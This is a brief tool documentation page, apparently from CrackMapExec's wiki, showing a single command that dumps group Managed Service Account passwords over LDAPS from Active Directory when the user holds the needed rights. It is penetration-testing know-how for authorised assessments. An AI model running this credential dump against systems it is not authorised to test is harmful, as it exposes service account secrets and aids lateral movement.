# Dump GMSA



Using the protocol LDAP you can extract the password of a gMSA account if you have the right.

{% hint style="warning" %}
LDAPS is required to retrieve the password, using the --gmsa LDAPS is automatically selected
{% endhint %}

```
$ crackmapexec ldap <ip> -u <user> -p <pass> --gmsa
```

<figure><img src="../../../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
